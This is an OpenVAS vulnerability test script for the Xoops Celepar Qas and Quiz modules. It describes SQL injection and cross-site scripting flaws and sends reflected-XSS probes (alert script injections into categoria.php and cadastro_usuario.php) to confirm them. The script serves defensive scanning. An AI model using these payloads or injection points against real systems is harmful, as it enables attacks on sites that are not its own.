##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_xoops_celepar_mult_vuln.nasl 8469 2018-01-19 07:58:21Z teissa $
#
# Xoops Celepar Multiple Vulnerabilities
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allow remote attackers to execute
arbitrary SQL statements on the vulnerable system, which may allow an attacker
to view, add, modify data, or delete information in the back-end database and
also conduct cross-site scripting.

Impact Level: Application.";

tag_affected = "Xoops Celepar module 2.2.4 and prior";

tag_insight = 
"- The flaw exists in 'Qas (aka Quas) module'. Input passed to the 'codigo'
   parameter in modules/qas/aviso.php and modules/qas/imprimir.php, and the
   'cod_categoria' parameter in modules/qas/categoria.php is not properly
   sanitised before being used in an SQL query.
 - The flaw exists in 'Qas (aka Quas) module' and 'quiz'module. Input passed
   to the 'opcao' parameter to modules/qas/index.php, and via the URL to
   modules/qas/categoria.php, modules/qas/index.php, and
   modules/quiz/cadastro_usuario.php is not properly sanitised before being
   returned to the user.";

tag_solution = "No solution or patch was made available for at least one year
since disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.";

tag_summary = "This host is running Xoops Celepar and is prone to multiple
  vulnerabilities.";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801153");
  script_version("$Revision: 8469 $");
  script_tag(name:"last_modification", value:"$Date: 2018-01-19 08:58:21 +0100 (Fri, 19 Jan 2018) $");
  script_tag(name:"creation_date", value:"2010-03-23 15:59:14 +0100 (Tue, 23 Mar 2010)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_bugtraq_id(35820);
  script_cve_id("CVE-2009-4698", "CVE-2009-4713", "CVE-2009-4714");
  script_name("Xoops Celepar Multiple Vulnerabilities");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/35966");
  script_xref(name : "URL" , value : "http://www.milw0rm.com/exploits/9249");
  script_xref(name : "URL" , value : "http://www.milw0rm.com/exploits/9261");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/51985");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2010 Greenbone Networks GmbH");
  script_dependencies("gb_xoops_celepar_detect.nasl");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}


include("http_func.inc");

## Get HTTP port
xoopsPort = get_http_port(default:80);
if(!xoopsPort){
  exit(0);
}

## Get Xoops Celepar version from KB
celeparVer = get_kb_item("www/" + xoopsPort + "/XoopsCelepar");
if(!celeparVer){
  exit(0);
}

celeparVer = eregmatch(pattern:"^(.+) under (/.*)$", string:celeparVer);

## Check for QAS module in Xoops Celepar
sndReq = http_get(item:string(celeparVer[2], "/modules/qas/index.php"),
                  port:xoopsPort);
rcvRes = http_send_recv(port:xoopsPort, data:sndReq);

## Confirm QAS module is installed
if(rcvRes =~ "^HTTP/1\.[01] 200" && "_MI_QAS_POR"  >< rcvRes)
{
  ## Send an exploit to QAS module and receive the response
  sndReq = http_get(item:string(celeparVer[2], "/modules/qas/categoria.php?" +
                    "cod_categoria='><script>alert('OpenVAS-XSS-Exploit');"+
                    "</script>"),
                     port:xoopsPort);
  rcvRes = http_send_recv(port:xoopsPort, data:sndReq);

  ## Check the response for XSS
  if(rcvRes =~ "^HTTP/1\.[01] 200" && "OpenVAS-XSS-Exploit" >< rcvRes)
  {
    security_message(xoopsPort);
    exit(0);
  }
}

## Check for Quiz module in Xoops Celepar
sndReq = http_get(item:string(celeparVer[2], "/modules/quiz/login.php"),
                  port:xoopsPort);
rcvRes = http_send_recv(port:xoopsPort, data:sndReq);

## Confirm Quiz module is installed
if(rcvRes =~ "^HTTP/1\.[01] 200" && "Quiz:"  >< rcvRes)
{
  ## Send an exploit to Quiz module and receive the response
  sndReq = http_get(item:string(celeparVer[2], "/module/quiz/" +
                    "cadastro_usuario.php/>'><ScRiPt>alert" +
                    "('OpenVAS-XSS-Exploit');</ScRiPt>"),
                     port:xoopsPort);
  rcvRes = http_send_recv(port:xoopsPort, data:sndReq);

  ## Check the response for XSS
  if(rcvRes =~ "^HTTP/1\.[01] 200" && "OpenVAS-XSS-Exploit" >< rcvRes)
  {
    security_message(xoopsPort);
    exit(0);
  }
}
